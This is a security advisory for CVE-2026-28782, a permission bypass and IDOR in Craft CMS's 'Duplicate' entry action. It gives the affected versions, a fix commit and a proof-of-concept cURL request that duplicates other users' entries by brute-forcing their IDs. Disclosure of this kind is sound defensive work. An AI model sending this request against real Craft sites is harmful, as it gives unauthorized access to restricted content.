# [M] Craft CMS has Permission Bypass and IDOR in Duplicate Entry Action

## Summary
Severity: Medium
Advisory: GHSA-jxm3-pmm2-9gf6
CVE: CVE-2026-28782
CWE: CWE-639
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-03-03
Source: https://github.com/advisories/GHSA-jxm3-pmm2-9gf6
Type: github-advisory

## Affected
- Packagist: `craftcms/cms` — affected >=5.0.0-RC1 <5.9.0-beta.1
- Packagist: `craftcms/cms` — affected >=4.0.0-RC1 <4.17.0-beta.1

## Details
## Description
The "Duplicate" entry action does not properly verify if the user has permission to perform this action on the specific target elements.
Even with only "View Entries" permission (where the "Duplicate" action is restricted in the UI), a user can bypass this restriction by sending a direct request.

Furthermore, this vulnerability allows duplicating **other users' entries** by specifying their Entry IDs. Since Entry IDs are incremental, an attacker can trivially brute-force these IDs to duplicate and access restricted content across the system.

## Proof of Concept
### Prerequisites
- A user with "View Entries" permission on any section.

### Steps to Reproduce
1. Log in as a user with minimal permissions ("View Entries").
1. Identify the target Entry ID (e.g., via brute-force `1` to `N`).
1. Send the following cURL request:
   > Replace `craft.local`, `<Cookie>`, `<CSRF>` and `6393` (which is the entry ID):
   ```bash
   curl --path-as-is -i -s -k -X $'POST' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0' -H $'Accept: application/json' -H $'Content-Type: application/json' -H $'X-CSRF-Token: <CSRF>' -H $'Content-Length: 216' -b $'<Cookie>' --data-binary $'{\"context\":\"index\",\"elementType\":\"craft\\\\elements\\\\Entry\",\"source\":\"section:17da21e5-0cfe-41f5-8cd2-450a94f7989c\",\"viewState\":{\"static\":true},\"elementAction\":\"craft\\\\elements\\\\actions\\\\Duplicate\",\"elementIds\":[6393]}' $'http://craft.local/index.php?p=admin%2Factions%2Felement-indexes%2Fperform-action'
   ```
1. Observe that a new entry is created with the attacker as the owner, granting full access to the content.

## Resources

https://github.com/craftcms/cms/commit/fb61a91357f5761c852400185ba931f51d82783d

## References
- https://github.com/craftcms/cms/security/advisories/GHSA-jxm3-pmm2-9gf6
- https://nvd.nist.gov/vuln/detail/CVE-2026-28782
- https://github.com/craftcms/cms/commit/fb61a91357f5761c852400185ba931f51d82783d
- https://github.com/craftcms/cms
